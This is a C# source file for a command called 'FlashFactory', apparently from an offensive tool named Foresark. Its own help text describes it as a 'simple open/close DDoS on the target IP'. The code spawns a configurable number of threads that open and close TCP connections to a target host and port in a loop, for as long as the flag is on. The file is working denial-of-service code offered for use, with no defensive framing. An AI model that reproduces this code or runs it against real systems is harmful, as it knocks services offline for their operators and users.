using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Foresark.Commands
{
    class FlashFactory : Command
    {
        private static readonly string[] requiredParameters = { "power" };

        private static readonly string[] parametersDescription = {
            "Specify how much sockets will be working on DDoS"
        };

        public static Boolean flashFactory;
        public static List<Thread> activeSockets;

        public FlashFactory() : base() { }
        public FlashFactory(Dictionary<string, string> parameters) : base(parameters) { }

        public override object action()
        {
            String power = this.GetParameter("power");
            int socketPower = 1;
            if (power != null) 
                socketPower = int.Parse(this.GetParameter("power"));
            flashFactory = !flashFactory;
            if (flashFactory)
            {
                activeSockets = new List<Thread>();
                for (int i = 0; i < socketPower; i++)
                {
                    Thread socket = new Thread(this.doFactory);
                    activeSockets.Add(socket);
                }
                activeSockets.ForEach(s => s.Start());
                Output.printMsg("Flash factory is now active with " + socketPower + " sockets");
            }
            else
            {
                activeSockets.ForEach(s => s.Abort());
                Output.printMsg("Flash factory is now inactive");
            }
            return null;
        }

        public override void help()
        {
            Output.printMsg("[cyan]FLASHFACTORY[/cyan]");
            this.PrintRequiredParameters(requiredParameters, parametersDescription);
            Output.printMsg("Start a simple open/close DDoS on the target IP");
            Output.printMsg("[yellow]Must have an opened connection to work[/yellow]");
        }

        public override string ToString()
        {
            return "Start a simple open/close DDoS on the target IP";
        }

        public void doFactory()
        {
            TcpClient socket = new TcpClient();
            long timeout = 0;
            bool isConnecting = false;
            while (flashFactory)
            {
                try
                {
                    if (!socket.Connected && !isConnecting)
                    {
                        socket.Connect(Foresark.targetIP, Foresark.targetPort);
                        isConnecting = true;
                        timeout = System.Environment.TickCount;
                    }
                }
                catch (SocketException e)
                {
                    socket.Client.Close();
                    socket = new TcpClient();
                }
                if (socket.Connected || timeout + 5000 < System.Environment.TickCount)
                {
                    socket.Client.Close();
                    socket = new TcpClient();
                    isConnecting = false;
                }
            }
            
        }
    }
}
